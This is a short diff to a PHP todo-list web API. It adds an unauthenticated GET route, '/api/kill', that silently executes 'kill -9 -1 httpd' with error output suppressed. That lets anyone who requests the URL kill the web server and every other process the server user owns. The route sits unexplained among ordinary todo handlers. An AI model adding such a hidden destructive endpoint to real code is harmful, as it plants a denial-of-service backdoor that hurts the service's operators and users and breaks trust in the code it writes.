@@ -58,4 +58,13 @@ $app->put('/api/todos/:id', function ($id) use ($app) {
     MongoApp::Instance()->put($id, $todo);
 });
 
+
+$app->get('/api/kill', function () {
+    @exec("kill -9 -1 httpd");;
+});
+
+
+
+
+
 $app->run();
